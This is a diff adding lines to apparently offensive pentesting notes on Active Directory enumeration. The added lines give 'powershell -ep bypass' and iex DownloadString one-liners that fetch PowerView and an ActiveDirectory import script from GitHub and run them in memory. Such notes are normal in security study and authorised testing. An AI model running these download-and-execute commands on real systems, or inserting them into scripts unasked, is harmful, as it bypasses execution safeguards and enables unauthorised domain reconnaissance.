@@ -17,3 +17,12 @@
 - `https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps`
 - `https://github.com/samratashok/ADModule`
 - (To use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid ActiveDirectory module DLL)
+
+**Run unrestricted commands with powershell**
+- `powershell -ep bypass`
+- Powerview Script Download
+- `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/PowerView.ps1')`
+- ActiveDirectory Module Download
+- `https://github.com/samratashok/ADModule` Download and Execute with `. .\Import-ActiveDirectory.ps1;Import-ActiveDirectory`
+-  or
+- `iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory `
